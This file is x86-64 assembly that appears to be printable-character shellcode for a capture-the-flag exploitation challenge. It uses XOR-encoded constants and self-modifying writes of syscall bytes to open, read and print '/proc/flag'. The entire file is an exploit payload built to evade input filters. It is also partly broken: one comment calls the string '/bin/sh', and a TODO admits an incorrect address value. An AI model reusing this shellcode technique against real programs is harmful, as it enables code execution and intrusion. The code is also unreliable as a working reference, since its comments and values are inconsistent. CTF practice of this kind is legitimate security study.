#include <sys/syscall.h>

.globl main
.type main, @function

main:

    /* PART I : OPEN */
    /* start of buf 0x6020c0 */
    /* about 100 bytes long! */
    /* Set rcx as stack pointer */
    push $0x58
    push %rsp
    pop %rcx
    pop %rax

    /* rdx = 0x6020c0, start of buf*/
    movslq 0x50(%rcx), %rax
    push $0x30585040
    pop %rax
    xor $0x30387140, %rax
    push %rax
    pop %rdx

    /* Write the syscall to designated place */
    push $0x30302847
    pop %rax
    xor $0x30307522, %eax            /* 0x602100 */
    push %rax
    pop %rax                        /* Garbage reg */
    movslq (%rcx), %rsi
    xor %esi, 0x5b(%rdx)

    /* Sycall written, set values now.
     allocate 16 bytes for '/proc/flag\0' */
    movslq 0x50(%rcx), %rsi
    xor %esi, 0x50(%rcx)
    movslq 0x54(%rcx), %rsi
    xor %esi, 0x54(%rcx)
    movslq 0x58(%rcx), %rsi
    xor %esi, 0x58(%rcx)
    movslq 0x5c(%rcx), %rsi
    xor %esi, 0x5c(%rcx)

    /* Zero rdx, rsi, and rdi */
    movslq 0x50(%rcx), %rdi
    movslq 0x50(%rcx), %rsi
    push %rdi
    pop %rdx

    /* Store '/bin/sh\0' in %rdi */
    push $0x31315039
    pop %rax
    xor $0x31313758, %eax
    xor %eax, 0x58(%rcx)            /* 'ag\0\0'  just went onto the stack */

    push $0x58575a3b
    pop %rax
    xor $0x34317558, %eax
    xor %eax, 0x54(%rcx)            /* 'c/fl' just went onto the stack */

    push $0x5b43475a
    pop %rax
    xor $0x34313775, %eax
    xor %eax, 0x50(%rcx)           /* /pro just went onto the stack*/
    xor 0x50(%rcx), %rdi
    xor 0x58(%rcx), %rsi

    pop %rax
    pop %rax
    push %rsi
    push %rdi

    push $0x58
    movslq (%rcx), %rsi
    xor (%rcx), %rsi                /* %rsi zeroed */
    movslq (%rcx), %rdi
    xor (%rcx), %rdi                /* %rdi zeroed */
    pop %rax
    push %rsp
    xor $0x5a, %al
    xor (%rcx), %rdi               /* From here, rdi = pointer to /proc/flag */
                                   /* rsi = 0 = read mode */

/* This will be modified to syscall */
    push $0x58

    /***********************************/
    /********** PART2 : READ ***********/
    /***********************************/
    /* eax now has fd, move it to rdi */
    push %rax
    pop  %rdi

    /* rsp in rcx */
    push $58
    push %rsp
    pop  %rcx
    pop %rax

    movslq (%rcx), %rsi
    xor %esi, (%rcx)
    movslq (%rcx), %rsi
    xor %esi, (%rcx)

    /* rdx = 0x602060 */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    push $0x30585058
    pop %rax
    xor $0x30387138, %rax
    push %rax
    pop %rdx

    /* emtpy rax again */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    /* Write the syscall to designated place */
    push $0x30302847
    pop %rax
    xor $0x30307522, %eax            /* 0x005d65 */
    push %rax
                          /* Garbage reg */
    movslq (%rcx), %rsi
    xor %esi, 0x58(%rdx)

    /* Put 0x100 into %rdx */
    push $0x61616161
    pop %rax
    xor $0x61616061, %eax
    push %rax
    pop %rdx

    push $0x58
    pop %rax
    push %rcx
    pop %rsi
    xor $0x58, %al

/* To be syscall*/
    push $0x58


    /***********************************/
    /********** PART3 : WRITE ***********/
    /***********************************/
    /* rsp in rcx */
    push $0x58
    push %rsp
    pop  %rcx
    pop %rax   /* Garbage */

    /* Set rdx = 0x602200 */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    push $0x30586858
    pop %rax
    xor $0x30384a58, %rax /* TODO: the value is not correct now */
    push %rax
    pop %rdx

    /* emtpy rax again */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    /* Write the syscall to designated place */
    push $0x30302847
    pop %rax
    xor $0x30302847, %eax            /* 0x005d65 */
    push %rax
    pop %rax                      /* Garbage reg */
    movslq (%rcx), %rdi
    xor %edi, 0x58(%rdx)

    /* Put 0x100 into %rdx */
    push $0x61616161
    pop %rax
    xor $0x61616561, %eax
    push %rax
    pop %rdx

    push $0x58
    pop %rax
    xor $0x59, %al /* rax set to 1 */
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi

/* To be syscall*/
    push $0x58
